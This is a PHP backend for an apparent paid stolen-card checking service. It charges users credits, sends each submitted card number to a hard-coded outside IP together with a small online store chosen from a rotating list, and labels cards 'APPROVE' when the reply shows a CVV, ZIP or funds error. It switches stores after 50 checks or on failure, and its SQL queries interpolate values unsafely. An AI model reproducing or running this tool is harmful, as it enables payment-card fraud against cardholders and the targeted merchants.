<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch current credits
$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct 1 credit
$update = "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'";
mysqli_query($conn, $update);

// Define sites to rotate
if (!isset($_SESSION['site_list'])) {
    $_SESSION['site_list'] = [
        'https://jupeykrusho.net',
        'https://store.larryjoetaylor.com',
        'https://www.judithknifeco.com',
        'https://lululalabys.com',
        'https://dodoutdoors.com',
        'https://cozyquilt.com',
        'https://whimsystamps.com'
    ];
    $_SESSION['current_site_index'] = 0;
    $_SESSION['checked_count'] = 0;
}

// Get current site from rotation
$site_list = $_SESSION['site_list'];
$current_index = $_SESSION['current_site_index'];
$current_site = $site_list[$current_index];
$_SESSION['checked_count']++;

if (isset($_POST['cc'])) {
    $cc = trim($_POST['cc']);
    $api_url = "http://137.184.155.22/index.php//?cc=" . urlencode($cc) . "&site=" . urlencode($current_site);

    $start = microtime(true);
    $response = @file_get_contents($api_url);
    $end = microtime(true);
    $time_taken = round($end - $start, 2) . 's';

    $decoded = json_decode($response, true);

    if (!$decoded || !isset($decoded['Response'])) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid response from API',
            'raw' => $response
        ]);
        exit();
    }

    $message_raw = strtolower($decoded['Response'] ?? '');
    $card = $decoded['cc'] ?? $cc;
    $price = $decoded['Price'] ?? '';
    $gateway = $decoded['Gateway'] ?? '';

    $approve_keywords = [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "thank you", "success", "invalid_cvc",
        "incorrect_cvc", "incorrect_zip", "3d_authentication"
    ];

    $reject_keywords = [
        "id empty", "token empty", "client token", "item is out of stock",
        "product id is empty", "curl error", "r2 id empty",
        "py id empty", "r4 token empty", "del ammount empty"
    ];

    $status = 'DECLINE ❌';
    foreach ($approve_keywords as $k) {
        if (strpos($message_raw, strtolower($k)) !== false) {
            $status = 'APPROVE ✅';
            break;
        }
    }

    $rotate = false;
    foreach ($reject_keywords as $r) {
        if (strpos($message_raw, strtolower($r)) !== false) {
            $rotate = true;
            break;
        }
    }

    if ($_SESSION['checked_count'] >= 50 || $rotate) {
        $_SESSION['checked_count'] = 0;
        $_SESSION['current_site_index'] = ($_SESSION['current_site_index'] + 1) % count($site_list);
    }

    echo json_encode([
        'status' => $status,
        'message' => $decoded['Response'] ?? 'No message',
        'card' => $card,
        'price' => $price,
        'gateway' => $gateway,
        'time' => $time_taken,
        'site_used' => $current_site,
        'raw' => $response
    ]);
} else {
    echo json_encode([
        'status' => 'Invalid Request',
        'message' => 'No card provided.'
    ]);
}
?>
